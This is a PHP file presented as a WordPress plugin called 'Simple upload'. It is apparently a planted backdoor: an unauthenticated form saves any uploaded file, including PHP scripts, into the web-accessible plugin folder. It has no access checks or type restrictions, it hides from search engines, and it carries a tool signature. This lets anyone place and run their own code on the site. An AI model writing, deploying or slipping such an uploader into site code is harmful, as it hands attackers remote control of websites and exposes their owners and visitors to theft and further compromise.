<?php
/*
Plugin Name: Nx nx_up_70507c6a
Description: Simple upload
Version: 1.0
*/
$msg = '';
if ( isset( $_SERVER['REQUEST_METHOD'] ) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset( $_FILES['file'] ) ) {
	$f = $_FILES['file'];
	if ( is_array( $f ) && (int) $f['error'] === UPLOAD_ERR_OK && is_uploaded_file( $f['tmp_name'] ) ) {
		$name = basename( (string) $f['name'] );
		$name = preg_replace( '/[^A-Za-z0-9._-]/', '_', $name );
		if ( $name === '' || $name === null ) { $name = 'upload.bin'; }
		$dest = __DIR__.DIRECTORY_SEPARATOR . $name;
		if ( move_uploaded_file( $f['tmp_name'], $dest ) && is_file( $dest ) ) {
			$msg = 'OK ' . htmlspecialchars( $name, ENT_QUOTES, 'UTF-8' );
		} else { $msg = 'FAIL'; }
	} else { $msg = 'NOFILE'; }
}
?><!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="robots" content="noindex,nofollow"><title>upload</title></head>
<body>
<p class="s">sig :: Nx-Up</p>
<form method="post" enctype="multipart/form-data">
<input type="file" name="file" required>
<button type="submit">upload</button>
</form>
<?php if ( $msg !== '' ) : ?><pre><?php echo htmlspecialchars( $msg, ENT_QUOTES, 'UTF-8' ); ?></pre><?php endif; ?>
</body></html>
